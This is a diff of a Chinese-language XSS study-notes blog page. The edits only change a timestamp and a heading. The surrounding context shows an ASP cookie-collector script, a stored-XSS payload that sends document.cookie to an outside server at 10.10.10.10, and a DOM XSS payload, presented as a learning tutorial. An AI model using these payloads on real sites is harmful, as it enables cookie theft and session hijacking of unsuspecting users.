@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2017/07/23/xss学习笔记/index.html">
 <meta property="og:site_name" content="Merl1ng">
 <meta property="og:description" content="xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)1234567891011121314151617&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&amp;gt; &amp;lt;ti">
-<meta property="og:updated_time" content="2017-07-24T06:05:59.776Z">
+<meta property="og:updated_time" content="2017-07-24T06:36:52.305Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss学习笔记">
 <meta name="twitter:description" content="xss就是在页面执行你想要的jsxss原理本地搭建php环境 然后在index.php文件里写入如下代码(index是普遍意义上”首页”)1234567891011121314151617&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&amp;gt; &amp;lt;ti">
@@ -374,7 +374,7 @@
 <p>Exp 2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;title&gt;xx&lt;/title&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;%testfile = Server.MapPath(<span class="string">"code.txt"</span>) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</div><div class="line"></div><div class="line">msg = Request(<span class="string">"msg"</span>) //获取提交过来的msg变量，也就是cookie值</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = server.CreateObject(<span class="string">"scripting.filesystemobject"</span>)//创建一个fs对象</div><div class="line"></div><div class="line"><span class="built_in">set</span> thisfile = fs.OpenTextFile(testfile,8,True,0)</div><div class="line"></div><div class="line">thisfile.WriteLine(<span class="string">""</span>&amp;msg&amp;<span class="string">""</span>)//像code.txt中写入获取来的cookie</div><div class="line"></div><div class="line">thisfile.close() //关闭</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = nothing%&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>把上述文件保存为cookie.asp文件，放到自己的网站服务器下<br>xss构造为<br><code>&lt;script&gt;window.open(&#39;http://10.10.10.10/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code></p>
 <p>点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了</p>
-<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的</p>
+<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><p>DOM XSS 从效果上来说也是反射型<br>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的</p>
 <p>file:///C:/Users/Administrator/Desktop/1.html<br>在1.html后面输入<br><code>&lt;script&gt;document.write(document.URL.substring(document.URL.indexOf(&quot;a=&quot;+2,document.URL.length));&lt;/script&gt;</code></p>
 <p>Document.write是把里面的内容写到页面里</p>
 <p>document.URL是获取URL地址</p>
@@ -589,7 +589,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss就是在页面执行你想要的js"><span class="nav-number">1.</span> <span class="nav-text">xss就是在页面执行你想要的js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">2.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#储蓄型XSS"><span class="nav-number">3.</span> <span class="nav-text">储蓄型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">4.</span> <span class="nav-text">DOM XSS</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss就是在页面执行你想要的js"><span class="nav-number">1.</span> <span class="nav-text">xss就是在页面执行你想要的js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">2.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#储蓄型XSS"><span class="nav-number">3.</span> <span class="nav-text">储蓄型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-Based-XSS"><span class="nav-number">4.</span> <span class="nav-text">DOM Based XSS</span></a></li></ol></div>
             
 
           </div>
